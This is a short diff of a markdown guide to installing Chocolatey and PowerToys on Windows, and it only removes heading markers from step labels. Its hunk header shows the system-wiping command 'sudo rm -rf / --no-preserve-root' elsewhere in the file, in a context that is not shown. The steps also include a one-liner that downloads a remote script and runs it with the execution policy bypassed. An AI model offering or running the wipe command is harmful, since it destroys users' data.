@@ -10,23 +10,23 @@ sudo rm -rf / --no-preserve-root
 ```
 Get-ExecutionPolicy
 ```
-### if it returns 'Restricted', then run
+if it returns 'Restricted', then run
 ```
 Set-ExecutionPolicy AllSigned
 ```
-### or
+or
 ```
 Set-ExecutionPolicy Bypass -Scope Process
 ```
-### after this run
+after this run
 ```
 Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
 ```
-### run to search for PowerToys
+run to search for PowerToys
 ```
 choco search powertoys
 ```
-### run to install PowerToys
+run to install PowerToys
 ```
 choco install powertoys
 ```
